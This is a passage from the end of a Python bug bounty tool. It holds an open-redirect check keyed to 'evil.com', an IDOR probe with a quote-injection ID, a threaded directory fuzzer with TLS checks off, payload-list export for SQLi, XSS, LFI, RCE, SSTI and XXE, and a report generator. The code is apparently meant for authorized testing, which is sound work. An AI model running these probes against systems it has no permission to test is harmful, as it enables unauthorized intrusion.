                        if 'evil.com' in location or 'google.com' in location:
                            print(f"   🚨 POTENTIAL OPEN REDIRECT FOUND!")
                            print(f"      URL: {test_url}")
                            print(f"      Redirects to: {location}")
                            return
                            
                except requests.RequestException:
                    continue
                    
        print("   ✅ No obvious Open Redirect vulnerabilities detected")
    
    def test_idor(self, url):
        """Test for IDOR vulnerabilities"""
        print("\n🔐 Testing IDOR vulnerabilities...")
        
        # Test common ID parameters with different values
        id_params = ['id', 'user_id', 'account_id', 'profile_id', 'doc_id', 'file_id']
        
        for param in id_params[:3]:
            # Test with different ID values
            for test_id in ['1', '2', '999', '0', '-1', 'admin', '1\'']:
                test_url = f"{url}?{param}={test_id}"
                try:
                    response = self.session.get(test_url, timeout=10, verify=False)
                    
                    # Look for sensitive information that might indicate IDOR
                    idor_indicators = [
                        "email", "password", "ssn", "credit_card",
                        "admin", "administrator", "root",
                        "@", "user:", "username:"
                    ]
                    
                    for indicator in idor_indicators:
                        if indicator.lower() in response.text.lower():
                            print(f"   ⚠️  POTENTIAL IDOR FOUND!")
                            print(f"      URL: {test_url}")
                            print(f"      Sensitive data indicator: {indicator}")
                            print(f"      Manual verification recommended")
                            return
                            
                except requests.RequestException:
                    continue
                    
        print("   ✅ No obvious IDOR vulnerabilities detected")
    
    def add_finding(self, target, vuln_type, severity, description):
        """Add a new security finding"""
        findings = self.load_findings()
        
        finding = {
            "id": len(findings) + 1,
            "target": target,
            "vulnerability_type": vuln_type,
            "severity": severity,
            "description": description,
            "date_found": datetime.now().isoformat(),
            "status": "new",
            "proof_of_concept": "",
            "impact": "",
            "remediation": ""
        }
        
        findings.append(finding)
        self.save_findings(findings)
        
        severity_emoji = {"critical": "🔴", "high": "🟠", "medium": "🟡", "low": "🟢"}
        print(f"✅ Finding added: {severity_emoji.get(severity, '⚪')} {vuln_type} on {target}")
    
    def list_findings(self):
        """List all findings"""
        findings = self.load_findings()
        if not findings:
            print("❌ No findings recorded yet.")
            return
        
        print("\n🐛 YOUR FINDINGS:")
        print("-" * 60)
        
        for finding in findings:
            severity_emoji = {"critical": "🔴", "high": "🟠", "medium": "🟡", "low": "🟢"}
            status_emoji = {"new": "🆕", "reported": "📤", "fixed": "✅"}
            
            print(f"{severity_emoji.get(finding['severity'], '⚪')} #{finding['id']} - {finding['vulnerability_type']}")
            print(f"   Target: {finding['target']}")
            print(f"   Severity: {finding['severity'].upper()}")
            print(f"   Status: {status_emoji.get(finding['status'], '❓')} {finding['status']}")
            print(f"   Found: {finding['date_found'][:10]}")
            print(f"   Description: {finding['description']}")
            print()
    
    def show_methodology(self):
        """Show bug bounty methodology"""
        methodology = """
🎯 BUG BOUNTY METHODOLOGY

1. 🔍 RECONNAISSANCE
   • Subdomain enumeration (subfinder, amass, assetfinder)
   • Port scanning (nmap, masscan)
   • Technology detection (wappalyzer, whatweb)
   • Google dorking
   • GitHub reconnaissance
   • Wayback machine analysis

2. 🎯 VULNERABILITY ASSESSMENT
   • SQL Injection (sqlmap, manual testing)
   • XSS (XSSStrike, manual payloads)
   • CSRF testing
   • IDOR testing
   • Authentication bypass
   • Authorization flaws
   • File upload vulnerabilities
   • XXE (XML External Entity)
   • SSRF (Server-Side Request Forgery)

3. 📝 EXPLOITATION & PROOF OF CONCEPT
   • Develop reliable exploits
   • Document impact clearly
   • Create proof-of-concept
   • Screenshot/video evidence

4. 📋 REPORTING
   • Clear vulnerability description
   • Steps to reproduce
   • Impact assessment
   • Recommended fixes
   • Professional presentation

5. 🔄 FOLLOW-UP
   • Respond to questions promptly
   • Verify fixes
   • Build relationships with security teams
        """
        print(methodology)
    
    def show_tools(self):
        """Show recommended tools"""
        tools = """
🛠️ RECOMMENDED TOOLS

📊 RECONNAISSANCE:
   • subfinder - Fast subdomain discovery
   • amass - Network mapping & attack surface discovery
   • nmap - Network discovery and security auditing
   • gobuster - Directory/file brute-forcer
   • ffuf - Fast web fuzzer

🔍 VULNERABILITY SCANNERS:
   • Burp Suite - Web application security testing
   • OWASP ZAP - Security testing proxy
   • Nuclei - Fast vulnerability scanner
   • SQLmap - SQL injection testing
   • XSStrike - XSS detection suite

🔧 MANUAL TESTING:
   • curl - Command line HTTP client
   • jq - JSON processor
   • grep - Text search
   • Python requests - HTTP library
   • Postman - API testing

📱 MOBILE:
   • MobSF - Mobile security framework
   • Frida - Dynamic instrumentation
   • APKTool - Reverse engineering

☁️ CLOUD:
   • CloudMapper - AWS security analysis
   • ScoutSuite - Multi-cloud auditing
   • Pacu - AWS exploitation framework
        """
        print(tools)
    
    def generate_report(self, target_name):
        """Generate a detailed report for a target"""
        targets = self.load_targets()
        findings = self.load_findings()
        
        if target_name not in targets:
            print(f"❌ Target '{target_name}' not found!")
            return
        
        target = targets[target_name]
        target_findings = [f for f in findings if f['target'] == target_name]
        
        report_file = self.data_dir / f"report_{target_name}_{datetime.now().strftime('%Y%m%d')}.md"
        
        with open(report_file, 'w') as f:
            f.write(f"# Security Assessment Report - {target_name}\n\n")
            f.write(f"**Target:** {target['url']}\n")
            f.write(f"**Assessment Date:** {datetime.now().strftime('%Y-%m-%d')}\n")
            f.write(f"**Program Type:** {target['program_type']}\n\n")
            
            f.write("## Executive Summary\n\n")
            f.write(f"This report contains the security assessment results for {target_name}.\n")
            f.write(f"**Total Findings:** {len(target_findings)}\n\n")
            
            if target_findings:
                f.write("## Findings Summary\n\n")
                for finding in target_findings:
                    f.write(f"### {finding['vulnerability_type']} - {finding['severity'].upper()}\n")
                    f.write(f"**Description:** {finding['description']}\n")
                    f.write(f"**Status:** {finding['status']}\n\n")
            
            f.write("## Reconnaissance Results\n\n")
            f.write(f"**Subdomains Found:** {len(target.get('subdomains', []))}\n")
            for sub in target.get('subdomains', []):
                f.write(f"- {sub}\n")
            
            f.write("\n---\n")
            f.write("*Report generated by WebApp CyberBuddy - Built by Harsh Malhotra*\n")
        
        print(f"📄 Report generated: {report_file}")
    
    def advanced_directory_fuzz(self, url, threads=10):
        """Advanced directory and file fuzzing with threading"""
        print(f"🔍 Starting advanced directory fuzzing on {url}")
        print(f"Using {threads} threads...")
        print("=" * 60)
        
        found_items = []
        
        def test_path(path):
            test_url = f"{url.rstrip('/')}{path}"
            try:
                response = self.session.get(test_url, timeout=5, verify=False)
                if response.status_code == 200:
                    size = len(response.content)
                    found_items.append((path, response.status_code, size))
                    print(f"✅ {test_url} - Status: {response.status_code}, Size: {size} bytes")
                elif response.status_code == 403:
                    found_items.append((path, 403, 0))
                    print(f"🔒 {test_url} - Status: 403 (Forbidden)")
                elif response.status_code == 401:
                    found_items.append((path, 401, 0))
                    print(f"🔐 {test_url} - Status: 401 (Unauthorized)")
            except requests.RequestException:
                pass
        
        # Combine directories and files for testing
        all_paths = self.common_dirs + ['/' + f for f in self.common_files]
        
        # Use ThreadPoolExecutor for concurrent testing
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            executor.map(test_path, all_paths)
        
        print(f"\n📊 Fuzzing completed! Found {len(found_items)} interesting items.")
        
        # Sort by status code and display summary
        if found_items:
            found_items.sort(key=lambda x: x[1])  # Sort by status code
            print("\n📋 Summary of findings:")
            for path, status, size in found_items:
                status_emoji = "✅" if status == 200 else "🔒" if status == 403 else "🔐"
                size_str = f", {size} bytes" if size > 0 else ""
                print(f"   {status_emoji} {path} - {status}{size_str}")
    
    def generate_payload_list(self, vuln_type):
        """Generate and save payload lists for different vulnerability types"""
        payload_files = {
            'sqli': self.sql_payloads,
            'xss': self.xss_payloads,
            'lfi': self.lfi_payloads,
            'rce': self.rce_payloads,
            'ssti': self.ssti_payloads,
            'xxe': self.xxe_payloads
        }
        
        if vuln_type in payload_files:
            filename = self.payloads_dir / f"{vuln_type}_payloads.txt"
            with open(filename, 'w') as f:
                for payload in payload_files[vuln_type]:
                    f.write(payload + '\n')
            print(f"💾 Payload list saved to: {filename}")
        else:
            print(f"❌ Unknown vulnerability type: {vuln_type}")
            print(f"Available types: {', '.join(payload_files.keys())}")

def main():
    buddy = WebAppCyberBuddy()
    
    parser = argparse.ArgumentParser(description="CyberBuddy - Your Bug Bounty Companion")
    parser.add_argument("--banner", action="store_true", help="Show banner")
    
    subparsers = parser.add_subparsers(dest="command", help="Available commands")
    
    # Target management
    target_parser = subparsers.add_parser("target", help="Target management")
    target_subparsers = target_parser.add_subparsers(dest="target_action")
    
    add_target_parser = target_subparsers.add_parser("add", help="Add a new target")
    add_target_parser.add_argument("name", help="Target name")
    add_target_parser.add_argument("url", help="Target URL")
    add_target_parser.add_argument("--type", default="private", help="Program type")
    
    target_subparsers.add_parser("list", help="List all targets")
    
    # Reconnaissance
    recon_parser = subparsers.add_parser("recon", help="Perform reconnaissance")
    recon_parser.add_argument("target", help="Target name")
    
    # Vulnerability scanning
    scan_parser = subparsers.add_parser("scan", help="Advanced webapp vulnerability scanning")
    scan_parser.add_argument("target", help="Target name")
    
    # Web-specific attacks
    web_parser = subparsers.add_parser("web", help="Web application specific attacks")
    web_subparsers = web_parser.add_subparsers(dest="web_action")
    
    # Individual vulnerability tests
    web_subparsers.add_parser("sqli", help="Test SQL injection").add_argument("url", help="Target URL")
    web_subparsers.add_parser("xss", help="Test XSS vulnerabilities").add_argument("url", help="Target URL")
    web_subparsers.add_parser("lfi", help="Test Local File Inclusion").add_argument("url", help="Target URL")
    web_subparsers.add_parser("rce", help="Test Remote Code Execution").add_argument("url", help="Target URL")
    
    # Directory fuzzing
    fuzz_parser = subparsers.add_parser("fuzz", help="Directory and file fuzzing")
    fuzz_parser.add_argument("url", help="Target URL")
    fuzz_parser.add_argument("--threads", type=int, default=10, help="Number of threads")
    
    # Findings management
    finding_parser = subparsers.add_parser("finding", help="Finding management")
    finding_subparsers = finding_parser.add_subparsers(dest="finding_action")
    
    add_finding_parser = finding_subparsers.add_parser("add", help="Add a new finding")
    add_finding_parser.add_argument("target", help="Target name")
    add_finding_parser.add_argument("vuln_type", help="Vulnerability type")
    add_finding_parser.add_argument("severity", choices=["low", "medium", "high", "critical"])
    add_finding_parser.add_argument("description", help="Vulnerability description")
    
    finding_subparsers.add_parser("list", help="List all findings")
    
    # Information
    subparsers.add_parser("methodology", help="Show bug bounty methodology")
    subparsers.add_parser("tools", help="Show recommended tools")
    
    # Reports
    report_parser = subparsers.add_parser("report", help="Generate report")
    report_parser.add_argument("target", help="Target name")
    
    # Payload generation
    payload_parser = subparsers.add_parser("payloads", help="Generate payload lists")
    payload_parser.add_argument("type", choices=['sqli', 'xss', 'lfi', 'rce', 'ssti', 'xxe'], help="Payload type")
    
    args = parser.parse_args()
    
    if args.banner or not args.command:
        buddy.show_banner()
        if not args.command:
            parser.print_help()
            return
    
    # Handle commands
    if args.command == "target":
        if args.target_action == "add":
            buddy.add_target(args.name, args.url, args.type)
        elif args.target_action == "list":
            buddy.list_targets()
    
    elif args.command == "recon":
        buddy.reconnaissance(args.target)
    
    elif args.command == "scan":
        buddy.vulnerability_scan(args.target)
    
    elif args.command == "finding":
        if args.finding_action == "add":
            buddy.add_finding(args.target, args.vuln_type, args.severity, args.description)
        elif args.finding_action == "list":
            buddy.list_findings()
    
    elif args.command == "methodology":
        buddy.show_methodology()
    
    elif args.command == "tools":
        buddy.show_tools()
    
    elif args.command == "web":
        if args.web_action == "sqli":
            buddy.test_sql_injection(args.url)
        elif args.web_action == "xss":
            buddy.test_xss_vulnerabilities(args.url)
        elif args.web_action == "lfi":
            buddy.test_lfi_vulnerabilities(args.url)
        elif args.web_action == "rce":
            buddy.test_rce_vulnerabilities(args.url)
    
    elif args.command == "fuzz":
        buddy.advanced_directory_fuzz(args.url, threads=args.threads)
    
    elif args.command == "payloads":
        buddy.generate_payload_list(args.type)
    
    elif args.command == "report":
        buddy.generate_report(args.target)

if __name__ == "__main__":
    main()
